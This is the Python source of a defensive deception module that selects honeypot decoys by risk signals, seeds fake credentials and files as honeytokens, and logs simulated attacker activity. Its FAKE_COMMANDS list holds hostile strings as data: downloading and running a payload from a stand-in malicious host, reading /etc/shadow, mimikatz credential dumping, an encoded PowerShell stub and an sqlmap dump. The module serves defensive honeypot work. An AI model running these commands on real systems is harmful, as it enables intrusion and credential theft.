"""Adaptive Deception Engine & Honeytoken Framework for CipherTwin.

Provides signal-driven adaptive decoy selection:
(risk_score, MITRE technique, event type, device trust, resource sensitivity, history)
-> selected_decoy, fidelity_level (LOW/MEDIUM/HIGH), reason, confidence.

Honeytoken System:
- Fake credentials, fake API keys, fake files, fake URLs, fake cookies, fake database records
- Complete lifecycle: Creation -> Trigger -> Detection -> Alert -> Threat Correlation -> Risk Escalation -> Deception Response -> Audit Event
"""
from dataclasses import dataclass
from datetime import datetime, timezone
import json
import logging
from typing import Any, Dict, List, Optional, Tuple
from sqlalchemy.orm import Session

from app.core.config import settings
from app.models.deception import DecoySession, Honeytoken
from app.models.twin import TwinNode
from app.services.audit import log_event

logger = logging.getLogger("ciphertwin.deception")

FAKE_CREDENTIALS = [
    "admin:Adm1n@2024!",
    "root:Toor#ProdDB",
    "svc_backup:B@ckup_Service!",
    "jdoe:Welcome2024!",
    "api_key=sk_live_5f7c9b3a2e8d4f1a",
    "AWS_ACCESS_KEY=AKIA3EXAMPLEKEY",
]

FAKE_FILES = [
    "Q4_Financial_Report.xlsx",
    "employee_salaries_2024.csv",
    "ceo_private_notes.docx",
    "customer_pii_dump.sql",
    "network_topology.png",
]

FAKE_URLS = [
    "https://vault.internal.corp/secrets/db_creds.txt",
    "https://admin-staging.internal.corp/export/users.csv",
    "https://s3.internal-backup.corp/keys/ssh_master.pem",
]

FAKE_COOKIES = [
    "ct_session=fake_5f7c9b3a2e8d4f1a_admin",
    "auth_token=jwt_fake_eyJhGciOiJIUzI1NiJ9.payload.sig",
]

FAKE_DB_RECORDS = [
    "SELECT id, card_num, cvv FROM payment_vault WHERE id=101;",
    "SELECT username, ssn FROM executive_payroll WHERE status='active';",
]

FAKE_COMMANDS = [
    "ls -la /etc/shadow",
    "cat /etc/passwd",
    "whoami && id",
    "ps aux | grep ssh",
    "wget http://malicious.example.com/payload.sh",
    "chmod +x payload.sh && ./payload.sh",
    "mimikatz.exe sekurlsa::logonpasswords",
    "net user administrator Password123!",
    "powershell -enc SQBFAFgAIAAo...",
    "sqlmap -u 'http://target/db?id=1' --dump",
]

DECOY_TYPES = ["ssh", "database", "web", "admin_panel", "api"]

DECOY_CONFIGURATIONS: Dict[str, Dict[str, Dict[str, str]]] = {
    "ssh": {
        "HIGH": {
            "persona": "Debian 12 GNU/Linux Bastion Host (PAM/LDAP Protected)",
            "banner": "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u1",
        },
        "MEDIUM": {
            "persona": "Ubuntu 22.04 LTS Jumphost Server",
            "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
        },
        "LOW": {
            "persona": "Alpine Linux SSH Probe Catcher",
            "banner": "SSH-2.0-OpenSSH_8.4p1-hpn14v12",
        },
    },
    "database": {
        "HIGH": {
            "persona": "PostgreSQL 15 Enterprise Cluster (Vault Schema)",
            "banner": "PostgreSQL 15.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14)",
        },
        "MEDIUM": {
            "persona": "MySQL 8.0 Financial Replica Node",
            "banner": "5.7.35-0ubuntu0.18.04.2-log MySQL Community Server (GPL)",
        },
        "LOW": {
            "persona": "SQL Port 1433 Decoy Listener",
            "banner": "Microsoft SQL Server 2019 (RTM) - 15.0.2000.5",
        },
    },
    "admin_panel": {
        "HIGH": {
            "persona": "Okta & Keycloak Identity Gateway v22.0",
            "banner": "Server: Envoy/1.26.0 (Admin Ingress Controller)",
        },
        "MEDIUM": {
            "persona": "Internal Kubernetes Management Portal",
            "banner": "Server: nginx/1.24.0 k8s-dashboard-backend",
        },
        "LOW": {
            "persona": "HTTP Basic Auth Gateway Decoy",
            "banner": "Server: Apache/2.4.52 (Ubuntu) HTTP/1.1 401 Unauthorized",
        },
    },
    "api": {
        "HIGH": {
            "persona": "Enterprise GraphQL & OAuth2 Token Service v2.4",
            "banner": "Server: Kong/3.3.0 Enterprise Gateway",
        },
        "MEDIUM": {
            "persona": "Internal Microservices REST Dispatcher",
            "banner": "Server: FastAPI/0.110.0 uvicorn/0.27.0",
        },
        "LOW": {
            "persona": "Decoy REST Endpoint Logger",
            "banner": "Server: Werkzeug/2.2.3 Python/3.11",
        },
    },
    "web": {
        "HIGH": {
            "persona": "Corporate Employee Portal & Asset Directory",
            "banner": "Server: cloudflare / Next.js 14 Enterprise Router",
        },
        "MEDIUM": {
            "persona": "Internal Confluence & Wiki Knowledgebase",
            "banner": "Server: Apache-Coyote/1.1 Tomcat/9.0.58",
        },
        "LOW": {
            "persona": "Default Gateway Landing Decoy",
            "banner": "Server: nginx/1.18.0 (Ubuntu)",
        },
    },
}


@dataclass
class AdaptiveDecoyDecision:
    selected_decoy: str
    fidelity_level: str  # LOW, MEDIUM, HIGH
    reason: str
    confidence: float
    persona: str = ""
    banner: str = ""

    @property
    def fidelity(self) -> str:
        return self.fidelity_level

    @property
    def decoy_type(self) -> str:
        return self.selected_decoy



class DeceptionEngine:
    def __init__(self, db: Session):
        self.db = db

    # ---- Signal-Driven Adaptive Decoy Selection ----
    @staticmethod
    def select_adaptive_decoy(
        risk_score: float,
        mitre_technique: Optional[str] = None,
        event_type: Optional[str] = None,
        device_trust: Optional[float] = None,
        sensitivity: Optional[str] = None,
        history_failures: int = 0,
    ) -> AdaptiveDecoyDecision:
        """Deterministically evaluate security signals to select the optimal decoy & fidelity."""
        evt = (event_type or "").lower()
        tech = (mitre_technique or "").upper()
        reasons = []

        # 1. Decoy Type Selection based on observed threat vectors
        if tech in ("T1021.004", "T1021", "T1059.001") or evt in ("ssh_attempt", "powershell"):
            selected = "ssh"
            reasons.append("Observed remote command execution or SSH signature")
        elif tech in ("T1041", "T1567", "T1003") or evt in ("data_exfiltration", "credential_dump") or sensitivity == "critical":
            selected = "database"
            reasons.append("Data exfiltration or credential dumping targeting high-sensitivity asset")
        elif tech in ("T1110", "T1078", "T1098") or evt in ("failed_login", "privilege_escalation"):
            selected = "admin_panel"
            reasons.append("Credential brute-force or privilege escalation against administrative boundary")
        elif "api" in evt or "token" in evt:
            selected = "api"
            reasons.append("API credential probing or token access signature")
        else:
            selected = "web"
            reasons.append("Web application anomaly or generic perimeter probe")

        # 2. Fidelity Level Selection based on attacker sophistication & risk
        is_high = (
            risk_score >= 75
            or evt in ("privilege_escalation", "data_exfiltration", "lateral_movement")
            or tech in ("T1059", "T1078", "T1098")
            or history_failures >= 3
            or (device_trust is not None and device_trust < 30)
        )
        is_medium = (
            risk_score >= 45
            or evt in ("failed_login", "powershell", "abnormal_process", "usb_insertion")
            or history_failures >= 1
            or (device_trust is not None and device_trust < 60)
        )

        if is_high:
            fidelity = "HIGH"
            conf = 0.92
            reasons.append("High risk posture and repeated failures warrant deep high-fidelity honeypot trap")
        elif is_medium:
            fidelity = "MEDIUM"
            conf = 0.85
            reasons.append("Moderate elevated risk warrants interactive simulation")
        else:
            fidelity = "LOW"
            conf = 0.75
            reasons.append("Baseline anomalous behavior routed to low-interaction decoy")

        full_reason = "; ".join(reasons)
        cfg = DECOY_CONFIGURATIONS.get(selected, {}).get(fidelity, {
            "persona": f"Standard {selected.capitalize()} Decoy",
            "banner": f"{selected}-service/1.0",
        })
        persona = cfg["persona"]
        banner = cfg["banner"]

        return AdaptiveDecoyDecision(
            selected_decoy=selected,
            fidelity_level=fidelity,
            reason=full_reason,
            confidence=conf,
            persona=persona,
            banner=banner,
        )

    # ---- Honeytoken Management ----
    def seed_honeytokens(self) -> List[Honeytoken]:
        """Seed all 6 required categories of honeytokens."""
        existing = self.db.query(Honeytoken).count()
        if existing:
            return self.db.query(Honeytoken).all()

        tokens = [
            Honeytoken(token_type="credential", label="Backup Operator Account",
                       value=FAKE_CREDENTIALS[2], planted_on="fileserver-01"),
            Honeytoken(token_type="credential", label="Cloud API Key",
                       value=FAKE_CREDENTIALS[4], planted_on="github.com/org/admin"),
            Honeytoken(token_type="file", label="Sensitive Report",
                       value=FAKE_FILES[0], planted_on="fileserver-01"),
            Honeytoken(token_type="file", label="Customer PII Dump",
                       value=FAKE_FILES[3], planted_on="db-replica"),
            Honeytoken(token_type="api_key", label="AWS Production Access Key",
                       value=FAKE_CREDENTIALS[5], planted_on="ci-runner-07"),
            Honeytoken(token_type="cookie", label="Internal Admin Session Cookie",
                       value=FAKE_COOKIES[0], planted_on="intranet.ct.local"),
            Honeytoken(token_type="url", label="Internal Vault Credential URL",
                       value=FAKE_URLS[0], planted_on="wiki.corp.internal"),
            Honeytoken(token_type="database", label="Decoy Credit Card Vault Query",
                       value=FAKE_DB_RECORDS[0], planted_on="prod-sql-cluster"),
        ]
        for t in tokens:
            self.db.add(t)
        self.db.commit()
        return tokens

    def trigger_honeytoken_lifecycle(
        self,
        token_id_or_value: str | int,
        actor: Optional[str] = None,
        source_ip: Optional[str] = None,
    ) -> Optional[Dict]:
        """Full Honeytoken Lifecycle:
        Trigger -> Detection -> Alert -> Threat Correlation -> Risk Escalation -> Deception Response -> Audit Event
        """
        token = None
        if isinstance(token_id_or_value, int) or (isinstance(token_id_or_value, str) and token_id_or_value.isdigit()):
            token = self.db.query(Honeytoken).filter(Honeytoken.id == int(token_id_or_value)).first()
        if not token:
            token = self.db.query(Honeytoken).filter(Honeytoken.value == str(token_id_or_value)).first()

        if not token:
            return None

        now = datetime.now(timezone.utc)
        token.triggered = 1
        token.last_triggered_at = now
        token.triggered_by = actor or "unauthorized_actor"
        self.db.commit()

        # 1. Audit Log Event
        log_event(
            self.db,
            action="honeytoken_triggered",
            actor=actor or "unknown",
            target=f"{token.token_type}:{token.label}",
            details=f"Honeytoken triggered on {token.planted_on}; value={token.value[:16]}...",
            severity="critical",
            ip_address=source_ip,
        )

        # 2. Correlate with Threat Intel & escalate
        from app.services.threat_intel import ThreatIntel
        intel = ThreatIntel(self.db)
        from app.models.telemetry import TelemetryEvent
        synthetic_event = TelemetryEvent(
            user_id=actor,
            event_type="credential_dump" if token.token_type in ("credential", "api_key") else "data_exfiltration",
            ip_address=source_ip,
            status="failure",
            risk_indicators=json.dumps(["honeytoken_triggered", "critical_asset_accessed"]),
        )
        threat = intel.correlate(synthetic_event, risk_score=95.0, decision="deceive")

        # 3. Open High-Fidelity Decoy Session to intercept the attacker
        decoy_session = self.open_decoy(
            actor=actor or "unknown",
            source_ip=source_ip or "0.0.0.0",
            threat_id=threat.id if threat else None,
            risk_score=95.0,
            event_type="honeytoken_triggered",
        )
        self.simulate_activity(decoy_session)

        return {
            "token": token.to_dict(),
            "alert": "CRITICAL: Honeytoken triggered",
            "escalated_risk": 95.0,
            "threat_id": threat.id if threat else None,
            "decoy_session_id": decoy_session.id,
        }

    # ---- Decoy Session Creation ----
    def open_decoy(
        self,
        *,
        actor: str,
        source_ip: str,
        threat_id: Optional[int],
        risk_score: float = 65.0,
        mitre_technique: Optional[str] = None,
        event_type: Optional[str] = None,
        device_trust: Optional[float] = None,
        sensitivity: Optional[str] = None,
    ) -> DecoySession:
        """Create a decoy session using adaptive signals and QAPRE placements."""
        decision = self.select_adaptive_decoy(
            risk_score=risk_score,
            mitre_technique=mitre_technique,
            event_type=event_type,
            device_trust=device_trust,
            sensitivity=sensitivity,
        )

        selected_nodes = [
            node
            for node in self.db.query(TwinNode).filter(
                TwinNode.type.notin_(("user", "honeypot"))
            ).all()
            if "optimized_honeypot" in (node.tags or "").split(",")
        ]
        compatible_types = {
            "ssh": {"server", "device", "laptop", "desktop", "tablet"},
            "database": {"database"},
            "web": {"application"},
            "admin_panel": {"server", "application"},
            "api": {"application", "server"},
        }
        compatible_nodes = [
            node for node in selected_nodes
            if node.type in compatible_types.get(decision.selected_decoy, set())
        ]
        placement_pool = compatible_nodes or selected_nodes
        target_node = max(
            placement_pool,
            key=lambda node: (float(node.risk_score or 0.0), node.id),
            default=None,
        )
        placement_activity = (
            [f"Routed to QAPRE placement node: {target_node.id} ({target_node.label})"]
            if target_node
            else []
        )

        session = DecoySession(
            threat_id=threat_id,
            decoy_type=decision.selected_decoy,
            target_node_id=target_node.id if target_node else None,
            fidelity=decision.fidelity_level,
            persona=decision.persona,
            banner=decision.banner,
            reason=decision.reason,
            confidence=decision.confidence,
            mode="SIMULATED",
            actor=actor,
            source_ip=source_ip,
            activity=json.dumps([
                *placement_activity,
                f"Deployed Persona: {decision.persona}",
                f"Service Banner: {decision.banner}",
                f"Connected to {decision.selected_decoy} decoy (fidelity={decision.fidelity_level})",
                f"Deception decision reason: {decision.reason}",
            ]),
            commands=json.dumps([]),
            pages=json.dumps([]),
            credentials_used=",".join(FAKE_CREDENTIALS[:2]),
            notes=(
                f"Persona: {decision.persona} | Banner: {decision.banner} | "
                f"Auto-redirected: Zero Trust decision='deceive'. {decision.reason}"
                + (f" QAPRE placement node={target_node.id}." if target_node else " No QAPRE placement was active.")
            ),
        )
        self.db.add(session)
        self.db.commit()
        self.db.refresh(session)
        return session

    def record_activity(
        self,
        session: DecoySession,
        *,
        command: Optional[str] = None,
        page: Optional[str] = None,
    ) -> DecoySession:
        cmds = json.loads(session.commands or "[]")
        pgs = json.loads(session.pages or "[]")
        if command:
            cmds.append(command)
        if page:
            pgs.append(page)
        session.commands = json.dumps(cmds)
        session.pages = json.dumps(pgs)
        self.db.commit()
        self.db.refresh(session)
        return session

    def simulate_activity(self, session: DecoySession) -> DecoySession:
        """Emulate attacker behavior according to the configured fidelity level."""
        fidelity = session.fidelity or "MEDIUM"
        if session.decoy_type == "ssh":
            cmd = FAKE_COMMANDS[0] if fidelity == "LOW" else FAKE_COMMANDS[4]
            return self.record_activity(session, command=cmd)
        elif session.decoy_type == "database":
            cmd = FAKE_DB_RECORDS[0] if fidelity == "HIGH" else "SELECT * FROM users WHERE 1=1"
            return self.record_activity(session, command=cmd)
        elif session.decoy_type in ("web", "admin_panel"):
            page = "/admin/secrets" if fidelity == "HIGH" else "/admin"
            return self.record_activity(session, page=page)
        elif session.decoy_type == "api":
            return self.record_activity(session, page="/api/v1/tokens")
        return session

    # ---- Read Helpers ----
    def list_sessions(self, limit: int = 100) -> List[DecoySession]:
        return (
            self.db.query(DecoySession)
            .order_by(DecoySession.timestamp.desc())
            .limit(limit)
            .all()
        )

    def fidelity_status(self) -> Dict[str, Any]:
        """Return fidelity status breakdown across all decoy sessions."""
        sessions = self.db.query(DecoySession).all()
        low = sum(1 for s in sessions if (s.fidelity or "MEDIUM").upper() == "LOW")
        med = sum(1 for s in sessions if (s.fidelity or "MEDIUM").upper() == "MEDIUM")
        high = sum(1 for s in sessions if (s.fidelity or "MEDIUM").upper() == "HIGH")
        return {
            "mode": settings.deception_mode,
            "total_sessions": len(sessions),
            "low_fidelity_count": low,
            "medium_fidelity_count": med,
            "high_fidelity_count": high,
            "fidelity_breakdown": {"low": low, "medium": med, "high": high},
        }


    def list_tokens(self) -> List[Honeytoken]:
        return self.db.query(Honeytoken).all()
